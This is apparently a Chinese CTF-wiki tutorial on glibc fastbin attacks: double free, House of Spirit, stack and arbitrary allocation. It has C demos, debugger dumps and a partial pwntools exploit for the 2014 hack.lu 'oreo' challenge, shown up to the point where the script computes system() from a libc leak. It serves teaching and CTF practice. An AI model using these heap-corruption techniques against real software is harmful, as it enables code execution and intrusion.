# Fastbin Attack

## 介紹
fastbin attack 是一類漏洞的利用方法，是指所有基於 fastbin 機制的漏洞利用方法。這類利用的前提是：

* 存在堆溢出、use-after-free 等能控制 chunk 內容的漏洞
* 漏洞發生於 fastbin 類型的 chunk 中

如果細分的話，可以做如下的分類：

- Fastbin Double Free
- House of Spirit
- Alloc to Stack
- Arbitrary Alloc

其中，前兩種主要漏洞側重於利用 `free` 函數釋放**真的 chunk 或僞造的 chunk**，然後再次申請 chunk 進行攻擊，後兩種側重於故意修改 `fd` 指針，直接利用 `malloc` 申請指定位置 chunk 進行攻擊。

## 原理

fastbin attack 存在的原因在於 fastbin 是使用單鏈表來維護釋放的堆塊的，並且由 fastbin 管理的 chunk 即使被釋放，其 next_chunk 的 prev_inuse 位也不會被清空。
我們來看一下 fastbin 是怎樣管理空閒 chunk 的。
```
int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    chunk1=malloc(0x30);
    chunk2=malloc(0x30);
    chunk3=malloc(0x30);
    //進行釋放
    free(chunk1);
    free(chunk2);
    free(chunk3);
    return 0;
}
```
釋放前
```
0x602000:	0x0000000000000000	0x0000000000000041 <=== chunk1
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000041 <=== chunk2
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000041 <=== chunk3
0x602090:	0x0000000000000000	0x0000000000000000
0x6020a0:	0x0000000000000000	0x0000000000000000
0x6020b0:	0x0000000000000000	0x0000000000000000
0x6020c0:	0x0000000000000000	0x0000000000020f41 <=== top chunk
```
執行三次 free 進行釋放後
```
0x602000:	0x0000000000000000	0x0000000000000041 <=== chunk1
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000000
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000041 <=== chunk2
0x602050:	0x0000000000602000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000041 <=== chunk3
0x602090:	0x0000000000602040	0x0000000000000000
0x6020a0:	0x0000000000000000	0x0000000000000000
0x6020b0:	0x0000000000000000	0x0000000000000000
0x6020c0:	0x0000000000000000	0x0000000000020f41 <=== top chunk
```
此時位於 main_arena 中的 fastbin 鏈表中已經儲存了指向 chunk3 的指針，並且 chunk 3、2、1構成了一個單鏈表
```
Fastbins[idx=2, size=0x30,ptr=0x602080]
===>Chunk(fd=0x602040, size=0x40, flags=PREV_INUSE)
===>Chunk(fd=0x602000, size=0x40, flags=PREV_INUSE)
===>Chunk(fd=0x000000, size=0x40, flags=PREV_INUSE)
```


## Fastbin Double Free

### 介紹

Fastbin Double Free 是指 fastbin 的 chunk 可以被多次釋放，因此可以在 fastbin 鏈表中存在多次。這樣導致的後果是多次分配可以從 fastbin 鏈表中取出同一個堆塊，相當於多個指針指向同一個堆塊，結合堆塊的數據內容可以實現類似於類型混淆(type confused)的效果。

Fastbin Double Free 能夠成功利用主要有兩部分的原因

1. fastbin 的堆塊被釋放後 next_chunk 的 pre_inuse 位不會被清空
2. fastbin 在執行 free 的時候僅驗證了 main_arena 直接指向的塊，即鏈表指針頭部的塊。對於鏈表後面的塊，並沒有進行驗證。

```
/* Another simple check: make sure the top of the bin is not the
	   record we are going to add (i.e., double free).  */
	if (__builtin_expect (old == p, 0))
	  {
	    errstr = "double free or corruption (fasttop)";
	    goto errout;
}
```

### 演示
下面的示例程序說明瞭這一點，當我們試圖執行以下代碼時

```
int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);

    free(chunk1);
    free(chunk1);
    return 0;
}
```
如果你執行這個程序，不出意外的話會得到如下的結果，這正是 _int_free 函數檢測到了 fastbin 的 double free。
```
*** Error in `./tst': double free or corruption (fasttop): 0x0000000002200010 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7fbb7a36c7e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7fbb7a37537a]
/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fbb7a37953c]
./tst[0x4005a2]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fbb7a315830]
./tst[0x400499]
======= Memory map: ========
00400000-00401000 r-xp 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00600000-00601000 r--p 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00601000-00602000 rw-p 00001000 08:01 1052570                            /home/Ox9A82/tst/tst
02200000-02221000 rw-p 00000000 00:00 0                                  [heap]
7fbb74000000-7fbb74021000 rw-p 00000000 00:00 0
7fbb74021000-7fbb78000000 ---p 00000000 00:00 0
7fbb7a0df000-7fbb7a0f5000 r-xp 00000000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fbb7a0f5000-7fbb7a2f4000 ---p 00016000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fbb7a2f4000-7fbb7a2f5000 rw-p 00015000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7fbb7a2f5000-7fbb7a4b5000 r-xp 00000000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a4b5000-7fbb7a6b5000 ---p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a6b5000-7fbb7a6b9000 r--p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a6b9000-7fbb7a6bb000 rw-p 001c4000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7fbb7a6bb000-7fbb7a6bf000 rw-p 00000000 00:00 0
7fbb7a6bf000-7fbb7a6e5000 r-xp 00000000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7fbb7a8c7000-7fbb7a8ca000 rw-p 00000000 00:00 0
7fbb7a8e1000-7fbb7a8e4000 rw-p 00000000 00:00 0
7fbb7a8e4000-7fbb7a8e5000 r--p 00025000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7fbb7a8e5000-7fbb7a8e6000 rw-p 00026000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7fbb7a8e6000-7fbb7a8e7000 rw-p 00000000 00:00 0
7ffcd2f93000-7ffcd2fb4000 rw-p 00000000 00:00 0                          [stack]
7ffcd2fc8000-7ffcd2fca000 r--p 00000000 00:00 0                          [vvar]
7ffcd2fca000-7ffcd2fcc000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
已放棄 (核心已轉儲)
```
如果我們在 chunk1 釋放後，再釋放 chunk2 ，這樣 main_arena 就指向 chunk2 而不是 chunk1 了，此時我們再去釋放 chunk1 就不再會被檢測到。
```
int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);

    free(chunk1);
    free(chunk2);
    free(chunk1);
    return 0;
}
```
第一次釋放`free(chunk1)`

![](./figure/fastbin_free_chunk1.png)

第二次釋放`free(chunk2)`

![](./figure/fastbin_free_chunk2.png)

第三次釋放`free(chunk1)`



![](./figure/fastbin_free_chunk3.png)


注意因爲 chunk1 被再次釋放因此其 fd 值不再爲 0 而是指向 chunk2，這時如果我們可以控制 chunk1 的內容，便可以寫入其 fd 指針從而實現在我們想要的任意地址分配 fastbin 塊。
下面這個示例演示了這一點，首先跟前面一樣構造 main_arena=>chunk1=>chun2=>chunk1的鏈表。之後第一次調用 malloc 返回 chunk1 之後修改 chunk1 的 fd 指針指向 bss 段上的 bss_chunk，之後我們可以看到 fastbin 會把堆塊分配到這裏。

```
typedef struct _chunk
{
    long long pre_size;
    long long size;
    long long fd;
    long long bk;
} CHUNK,*PCHUNK;

CHUNK bss_chunk;

int main(void)
{
    void *chunk1,*chunk2,*chunk3;
    void *chunk_a,*chunk_b;

    bss_chunk.size=0x21;
    chunk1=malloc(0x10);
    chunk2=malloc(0x10);

    free(chunk1);
    free(chunk2);
    free(chunk1);

    chunk_a=malloc(0x10);
    *(long long *)chunk_a=&bss_chunk;
    malloc(0x10);
    malloc(0x10);
    chunk_b=malloc(0x10);
    printf("%p",chunk_b);
    return 0;
}
```
在我的系統上 chunk_b 輸出的值會是 0x601090，這個值位於bss段中正是我們之前設置的`CHUNK bss_chunk`
```
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst
0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]

0x601080 <bss_chunk>:	0x0000000000000000	0x0000000000000021
0x601090 <bss_chunk+16>:0x0000000000000000	0x0000000000000000
0x6010a0:	            0x0000000000000000	0x0000000000000000
0x6010b0:	            0x0000000000000000	0x0000000000000000
0x6010c0:	            0x0000000000000000	0x0000000000000000
```
值得注意的是，我們在 main 函數的第一步就進行了`bss_chunk.size=0x21;`的操作，這是因爲_int_malloc會對欲分配位置的 size 域進行驗證，如果其 size 與當前 fastbin 鏈表應有 size 不符就會拋出異常。
```
*** Error in `./tst': malloc(): memory corruption (fast): 0x0000000000601090 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f8f9deb27e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x82651)[0x7f8f9debd651]
/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f8f9debf184]
./tst[0x400636]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f8f9de5b830]
./tst[0x4004e9]
======= Memory map: ========
00400000-00401000 r-xp 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00600000-00601000 r--p 00000000 08:01 1052570                            /home/Ox9A82/tst/tst
00601000-00602000 rw-p 00001000 08:01 1052570                            /home/Ox9A82/tst/tst
00bc4000-00be5000 rw-p 00000000 00:00 0                                  [heap]
7f8f98000000-7f8f98021000 rw-p 00000000 00:00 0
7f8f98021000-7f8f9c000000 ---p 00000000 00:00 0
7f8f9dc25000-7f8f9dc3b000 r-xp 00000000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f8f9dc3b000-7f8f9de3a000 ---p 00016000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f8f9de3a000-7f8f9de3b000 rw-p 00015000 08:01 398790                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f8f9de3b000-7f8f9dffb000 r-xp 00000000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9dffb000-7f8f9e1fb000 ---p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9e1fb000-7f8f9e1ff000 r--p 001c0000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9e1ff000-7f8f9e201000 rw-p 001c4000 08:01 415688                     /lib/x86_64-linux-gnu/libc-2.23.so
7f8f9e201000-7f8f9e205000 rw-p 00000000 00:00 0
7f8f9e205000-7f8f9e22b000 r-xp 00000000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7f8f9e40d000-7f8f9e410000 rw-p 00000000 00:00 0
7f8f9e427000-7f8f9e42a000 rw-p 00000000 00:00 0
7f8f9e42a000-7f8f9e42b000 r--p 00025000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7f8f9e42b000-7f8f9e42c000 rw-p 00026000 08:01 407367                     /lib/x86_64-linux-gnu/ld-2.23.so
7f8f9e42c000-7f8f9e42d000 rw-p 00000000 00:00 0
7fff71a94000-7fff71ab5000 rw-p 00000000 00:00 0                          [stack]
7fff71bd9000-7fff71bdb000 r--p 00000000 00:00 0                          [vvar]
7fff71bdb000-7fff71bdd000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
已放棄 (核心已轉儲)
```
_int_malloc 中的校驗如下
```
if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
	{
	  errstr = "malloc(): memory corruption (fast)";
	errout:
	  malloc_printerr (check_action, errstr, chunk2mem (victim));
	  return NULL;
}
```

### 小總結
通過 fastbin double free 我們可以使用多個指針控制同一個堆塊，這可以用於篡改一些堆塊中的關鍵數據域或者是實現類似於類型混淆的效果。
如果更進一步修改 fd 指針，則能夠實現任意地址分配堆塊的效果( 首先要通過驗證 )，這就相當於任意地址寫任意值的效果。

## House Of Spirit

### 介紹

House of Spirit 是 `the Malloc Maleficarum` 中的一種技術。

該技術的核心在於在目標位置處僞造 fastbin chunk，並將其釋放，從而達到分配**指定地址**的 chunk 的目的。

要想構造 fastbin fake chunk，並且將其釋放時，可以將其放入到對應的 fastbin 鏈表中，需要繞過一些必要的檢測，即

- fake chunk 的 ISMMAP 位不能爲1，因爲 free 時，如果是 mmap 的 chunk，會單獨處理。
- fake chunk 地址需要對齊， MALLOC_ALIGN_MASK
- fake chunk 的 size 大小需要滿足對應的 fastbin 的需求，同時也得對齊。
- fake chunk 的 next chunk 的大小不能小於 `2 * SIZE_SZ`，同時也不能大於`av->system_mem` 。
- fake chunk 對應的 fastbin 鏈表頭部不能是該 fake chunk，即不能構成 double free 的情況。

至於爲什麼要繞過這些檢測，可以參考 free 部分的源碼。

### 演示

這裏就直接以 how2heap 上的例子進行說明，如下

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
	fprintf(stderr, "This file demonstrates the house of spirit attack.\n");

	fprintf(stderr, "Calling malloc() once so that it sets up its memory.\n");
	malloc(1);

	fprintf(stderr, "We will now overwrite a pointer to point to a fake 'fastbin' region.\n");
	unsigned long long *a;
	// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
	unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));

	fprintf(stderr, "This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n", sizeof(fake_chunks), &fake_chunks[1], &fake_chunks[7]);

	fprintf(stderr, "This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
	fprintf(stderr, "... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
	fake_chunks[1] = 0x40; // this is the size

	fprintf(stderr, "The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n");
        // fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8
	fake_chunks[9] = 0x1234; // nextsize

	fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
	fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");
	a = &fake_chunks[2];

	fprintf(stderr, "Freeing the overwritten pointer.\n");
	free(a);

	fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
	fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30));
}
```

運行後的效果如下

```shell
➜  how2heap git:(master) ./house_of_spirit
This file demonstrates the house of spirit attack.
Calling malloc() once so that it sets up its memory.
We will now overwrite a pointer to point to a fake 'fastbin' region.
This region (memory of length: 80) contains two chunks. The first starts at 0x7ffd9bceaa58 and the second at 0x7ffd9bceaa88.
This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (<= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.
... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.
The chunk.size of the *next* fake region has to be sane. That is > 2*SIZE_SZ (> 16 on x64) && < av->system_mem (< 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.
Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffd9bceaa58.
... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.
Freeing the overwritten pointer.
Now the next malloc will return the region of our fake chunk at 0x7ffd9bceaa58, which will be 0x7ffd9bceaa60!
malloc(0x30): 0x7ffd9bceaa60
```

### 小總結

可以看出，想要使用該技術分配 chunk 到指定地址，其實並不需要修改指定地址的任何內容，**關鍵是要能夠修改指定地址的前後的內容使其可以繞過對應的檢測**。

## Alloc to Stack

### 介紹

如果你已經理解了前文所講的 Fastbin Double Free 與 house of spirit 技術，那麼理解該技術就已經不成問題了，它們的本質都在於 fastbin 鏈表的特性：當前 chunk 的 fd 指針指向下一個 chunk。

該技術的核心點在於劫持 fastbin 鏈表中 chunk 的 fd 指針，把 fd 指針指向我們想要分配的棧上，從而實現控制棧中的一些關鍵數據，比如返回地址等。

### 演示
這次我們把 fake_chunk 置於棧中稱爲 stack_chunk，同時劫持了 fastbin 鏈表中 chunk 的 fd 值，通過把這個 fd 值指向 stack_chunk 就可以實現在棧中分配 fastbin chunk。
```
typedef struct _chunk
{
    long long pre_size;
    long long size;
    long long fd;
    long long bk;
} CHUNK,*PCHUNK;

int main(void)
{
    CHUNK stack_chunk;

    void *chunk1;
    void *chunk_a;

    stack_chunk.size=0x21;
    chunk1=malloc(0x10);

    free(chunk1);

    *(long long *)chunk1=&stack_chunk;
    malloc(0x10);
    chunk_a=malloc(0x10);
    return 0;
}
```
通過 gdb 調試可以看到我們首先把 chunk1 的 fd 指針指向了 stack_chunk
```
0x602000:	0x0000000000000000	0x0000000000000021 <=== chunk1
0x602010:	0x00007fffffffde60	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000020fe1 <=== top chunk
```
之後第一次 malloc 使得 fastbin 鏈表指向了 stack_chunk，這意味着下一次分配會使用 stack_chunk 的內存進行
```
0x7ffff7dd1b20 <main_arena>:	0x0000000000000000 <=== unsorted bin
0x7ffff7dd1b28 <main_arena+8>:  0x00007fffffffde60 <=== fastbin[0]
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000
```
最終第二次malloc返回值爲0x00007fffffffde70也就是stack_chunk
```
   0x400629 <main+83>        call   0x4004c0 <malloc@plt>
 → 0x40062e <main+88>        mov    QWORD PTR [rbp-0x38], rax
   $rax   : 0x00007fffffffde70

0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/Ox9A82/tst/tst
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/Ox9A82/tst/tst
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/Ox9A82/tst/tst
0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]
0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw-
0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw-
0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw-
0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]

```


### 小總結
通過該技術我們可以把 fastbin chunk 分配到棧中，從而控制返回地址等關鍵數據。要實現這一點我們需要劫持fastbin 中 chunk 的 fd 域，把它指到棧上，當然同時需要棧上存在有滿足條件的size值。

## Arbitrary Alloc

### 介紹

Arbitrary Alloc 其實與 Alloc to stack 是完全相同的，唯一的區別是分配的目標不再是棧中。
事實上只要滿足目標地址存在合法的 size 域（這個 size 域是構造的，還是自然存在的都無妨），我們可以把 chunk 分配到任意的可寫內存中，比如bss、heap、data、stack等等。

### 演示
在這個例子，我們使用字節錯位來實現直接分配 fastbin 到**\_malloc_hook的位置，相當於覆蓋_malloc_hook來控制程序流程。**
```
int main(void)
{


    void *chunk1;
    void *chunk_a;

    chunk1=malloc(0x60);

    free(chunk1);

    *(long long *)chunk1=0x7ffff7dd1af5-0x8;
    malloc(0x60);
    chunk_a=malloc(0x60);
    return 0;
}
```
這裏的0x7ffff7dd1af5是我根據本機的情況得出的值，這個值是怎麼獲得的呢？首先我們要觀察欲寫入地址附近是否存在可以字節錯位的情況。
```
0x7ffff7dd1a88 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1a90 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1a98 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1aa0 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1aa8 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1ab0 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1ab8 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1ac0 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1ac8 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1ad0 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1ad8 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1ae0 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1ae8 0x0	0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1af0 0x60 0x2	0xdd 0xf7 0xff 0x7f	0x0	0x0
0x7ffff7dd1af8 0x0  0x0	0x0	0x0	0x0	0x0	0x0	0x0
0x7ffff7dd1b00 0x20	0x2e 0xa9 0xf7 0xff	0x7f 0x0 0x0
0x7ffff7dd1b08 0x0	0x2a 0xa9 0xf7 0xff	0x7f 0x0 0x0
0x7ffff7dd1b10 <__malloc_hook>:	0x30	0x28	0xa9	0xf7	0xff	0x7f	0x0	0x0
```
0x7ffff7dd1b10 是我們想要控制的 __malloc_hook 的地址，於是我們向上尋找是否可以錯位出一個合法的size域。因爲這個程序是 64 位的，因此 fastbin 的範圍爲32字節到128字節(0x20-0x80)，如下：
```
//這裏的size指用戶區域，因此要小2倍SIZE_SZ
Fastbins[idx=0, size=0x10]
Fastbins[idx=1, size=0x20]
Fastbins[idx=2, size=0x30]
Fastbins[idx=3, size=0x40]
Fastbins[idx=4, size=0x50]
Fastbins[idx=5, size=0x60]
Fastbins[idx=6, size=0x70]
```
通過觀察發現 0x7ffff7dd1af5 處可以現實錯位構造出一個0x000000000000007f
```
0x7ffff7dd1af0 0x60 0x2	0xdd 0xf7 0xff 0x7f	0x0	0x0
0x7ffff7dd1af8 0x0  0x0	0x0	0x0	0x0	0x0	0x0	0x0

0x7ffff7dd1af5 <_IO_wide_data_0+309>:	0x000000000000007f
```
因爲 0x7f 在計算 fastbin index 時，是屬於 index 5 的，即 chunk 大小爲 0x70 的。

```c
##define fastbin_index(sz)                                                      \
    ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2)
```
（注意sz的大小是unsigned int，因此只佔4個字節）


而其大小又包含了 0x10 的 chunk_header，因此我們選擇分配 0x60 的 fastbin，將其加入鏈表。
最後經過兩次分配可以觀察到 chunk 被分配到 0x7ffff7dd1afd，因此我們就可以直接控制 __malloc_hook的內容(在我的libc中__realloc_hook與__malloc_hook是在連在一起的)。

```
0x4005a8 <main+66>        call   0x400450 <malloc@plt>
 →   0x4005ad <main+71>        mov    QWORD PTR [rbp-0x8], rax

 $rax   : 0x7ffff7dd1afd

0x7ffff7dd1aed <_IO_wide_data_0+301>:	0xfff7dd0260000000	0x000000000000007f
0x7ffff7dd1afd:	0xfff7a92e20000000	0xfff7a92a0000007f
0x7ffff7dd1b0d <__realloc_hook+5>:	0x000000000000007f	0x0000000000000000
0x7ffff7dd1b1d:	0x0000000000000000	0x0000000000000000

```


### 小總結
Arbitrary Alloc 在 CTF 中用地更加頻繁。我們可以利用字節錯位等方法來繞過 size 域的檢驗，實現任意地址分配 chunk，最後的效果也就相當於任意地址寫任意值。

## 2014 hack.lu oreo
[題目鏈接](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/linux/user-mode/heap/fastbin-attack/2014_hack.lu_oreo)

### 基本分析

```shell
➜  2014_Hack.lu_oreo git:(master) file oreo
oreo: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.26, BuildID[sha1]=f591eececd05c63140b9d658578aea6c24450f8b, stripped
➜  2014_Hack.lu_oreo git:(master) checksec oreo
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_spirit/2014_Hack.lu_oreo/oreo'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

可以看出，程序確實是比較老的，32位程序，動態鏈接，就連 RELRO 技術也沒有上。

### 基本功能

**需要注意的是，該程序並沒有進行 setvbuf 操作，因此在初次執行 io 函數時，會在堆上分配空間。**

正如程序中直接輸出的信息，程序主要是一個原始的在線槍支系統。其中，根據添加槍支的過程，我們可以得到槍支的基本結構如下

```c
00000000 rifle           struc ; (sizeof=0x38, mappedto_5)
00000000 descript        db 25 dup(?)
00000019 name            db 27 dup(?)
00000034 next            dd ?                    ; offset
00000038 rifle           ends
```

程序的基本功能如下

- 添加槍支，其主要會讀取槍支的名字與描述。但問題在於讀取的名字的長度過長，可以覆蓋 next 指針以及後面堆塊的數據。可以覆蓋後面堆塊的數據大小爲 56-(56-27)=27 大小。需要注意的是，這些槍支的大小都是在fastbin 範圍內的。
- 展示添加槍支，即從頭到尾輸出槍支的描述與名字。
- 訂已經選擇的槍支，即將所有已經添加的槍支釋放掉，但是並沒有置爲NULL。
- 留下訂貨消息
- 展示目前狀態，即添加了多少隻槍，訂了多少單，留下了什麼信息。

不難分析得到，程序的漏洞主要存在於添加槍支時的堆溢出漏洞。

### 利用

基本利用思路如下

1. 由於程序存在堆溢出漏洞，而且還可以控制 next 指針，我們可以直接控制 next 指針指向程序中 got 表的位置。當進行展示的時候，即可以輸出對應的內容，這裏同時需要確保假設對應地址爲一個槍支結構體時，其 next 指針爲 NULL。這裏我採用 puts@got。通過這樣的操作，我們就可以獲得出 libc 基地址，以及 system 函數地址。
2. 由於槍支結構體大小是 0x38 大小，所以其對應的 chunk 爲 0x40。這裏採用 `house of sprit` 的技術來返回 0x0804A2A8 處的chunk，即留下的消息的指針。因此，我們需要設置 0x0804A2A4 處的內容爲 0x40，即需要添加 0x40 支槍支，從而繞過大小檢測。同時爲了確保可以繞過 next chunk 的檢測，這裏我們編輯留下的消息。
3. 在成功分配這樣的 chunk 後，我們其實就有了一個任意地址修改的漏洞，這裏我們可以選擇修改一個合適的 got 項爲 system 地址，從而獲得 shell。

具體代碼如下

```python
from pwn import *
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
context.binary = "./oreo"
oreo = ELF("./oreo")
if args['REMOTE']:
    p = remote(ip, port)
else:
    p = process("./oreo")
log.info('PID: ' + str(proc.pidof(p)[0]))
libc = ELF('./libc.so.6')


def add(descrip, name):
    p.sendline('1')
    #p.recvuntil('Rifle name: ')
    p.sendline(name)
    #p.recvuntil('Rifle description: ')
    #sleep(0.5)
    p.sendline(descrip)


def show_rifle():
    p.sendline('2')
    p.recvuntil('===================================\n')


def order():
    p.sendline('3')


def message(notice):
    p.sendline('4')
    #p.recvuntil("Enter any notice you'd like to submit with your order: ")
    p.sendline(notice)


def exp():
    print 'step 1. leak libc base'
    name = 27 * 'a' + p32(oreo.got['puts'])
    add(25 * 'a', name)
    show_rifle()
    p.recvuntil('===================================\n')
    p.recvuntil('Description: ')
    puts_addr = u32(p.recvuntil('\n', drop=True)[:4])
    log.success('puts addr: ' + hex(puts_addr))
    libc_base = puts_addr - libc.symbols['puts']
    system_addr = libc_base + libc.symbols['system']
